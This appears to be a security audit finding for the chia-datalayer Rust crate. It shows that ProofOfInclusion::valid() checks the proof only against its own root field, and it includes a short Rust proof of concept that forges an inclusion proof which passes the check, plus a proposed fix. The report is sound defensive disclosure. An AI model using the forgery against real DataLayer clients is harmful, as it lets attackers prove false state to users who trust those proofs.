### Title
`ProofOfInclusion::valid()` Validates Against Its Own Attacker-Controlled Root, Enabling Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` only checks that the hash chain is internally self-consistent. The final comparison is `existing_hash == self.root_hash()`, but `root_hash()` returns `last.combined_hash` — a field that is part of the proof itself. After the loop, `existing_hash` is guaranteed to equal `last.combined_hash` by the loop invariant, making the final check trivially true. The function never compares the computed root against any externally trusted root. An attacker who can supply a `ProofOfInclusion` (e.g., via deserialization over the network) can craft a proof that `valid()` accepts for any arbitrary `node_hash`, with any attacker-chosen `root_hash()`.

### Finding Description

In `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`, `valid()` is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true if loop completes
}
```

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← attacker-controlled field
    } else {
        self.node_hash
    }
}
```

**Loop invariant:** at the end of each iteration, `existing_hash = calculated_hash` and the loop only continues if `calculated_hash == layer.combined_hash`. So after the loop, `existing_hash` equals the last `combined_hash`. `self.root_hash()` also returns the last `combined_hash`. The final check `existing_hash == self.root_hash()` is therefore always `true` when the loop completes without early return.

The function never compares the computed root against any external, trusted root value. The proof validates itself against its own data.

`ProofOfInclusion` is `Streamable` (deserializable from bytes via `from_bytes()`) and exposed as a Python `pyclass` with `get_all` (all fields publicly readable/writable from Python). Any code path that deserializes a `ProofOfInclusion` from an untrusted peer and calls `valid()` as the sole check is fully bypassable.

The analog to the external report: just as `Ownable(msg.sender).owner()` trusts the caller to return an honest value, `valid()` trusts the proof's own `combined_hash` field as the authoritative root — both allow an attacker to supply crafted data that satisfies the check while proving nothing about the real state.

### Impact Explanation

An attacker can construct a `ProofOfInclusion` with:
- Any arbitrary `node_hash` (the claimed included key-value pair hash)
- Any set of layers where each `combined_hash` is correctly computed from the previous hash and `other_hash` (trivially satisfiable)
- Any attacker-chosen `root_hash()` (the last `combined_hash`)

`valid()` returns `true` for this forged proof. Any DataLayer client that calls `proof.valid()` without separately comparing `proof.root_hash()` against a known-good root accepts the forged inclusion proof. This lets untrusted input prove invalid DataLayer state — matching the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."

### Likelihood Explanation

The method is named `valid()` with no parameters, strongly implying it is a complete validity check. The Python type stub exposes it as `def valid(self) -> bool: ...` with no documentation requiring a separate root comparison. The `ProofOfInclusion` struct is `Streamable` and fully deserializable from bytes, so any DataLayer peer can supply a crafted proof. Developers receiving proofs from remote DataLayer nodes are likely to call `valid()` as the sole check, matching the pattern of the external report's attacker implementing a fake `owner()`.

### Recommendation

`valid()` must accept an externally trusted root and compare against it, not against the proof's own field:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == *trusted_root   // compare against external trusted root
}
```

The existing `valid()` (which only checks internal consistency) should be renamed to `is_internally_consistent()` to make its limited scope explicit, preventing misuse.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_datalayer::calculate_internal_hash;

// Attacker claims this arbitrary hash is included in the tree
let forged_node_hash: Hash = [0xDE; 32];
let sibling_hash: Hash    = [0xAD; 32];

// Build one internally-consistent layer — combined_hash is attacker-chosen
let combined = calculate_internal_hash(&forged_node_hash, Side::Left, &sibling_hash);

let forged_proof = ProofOfInclusion {
    node_hash: forged_node_hash,
    layers: vec![ProofOfInclusionLayer {
        other_hash_side: Side::Left,
        other_hash: sibling_hash,
        combined_hash: combined,   // attacker controls this
    }],
};

// valid() returns true — the proof validates itself
assert!(forged_proof.valid());

// root_hash() returns the attacker-chosen combined hash, not any real tree root
assert_eq!(forged_proof.root_hash(), combined);

// Any DataLayer client that does:
//   if proof.valid() { accept_inclusion(...) }
// will accept this forged proof for forged_node_hash.
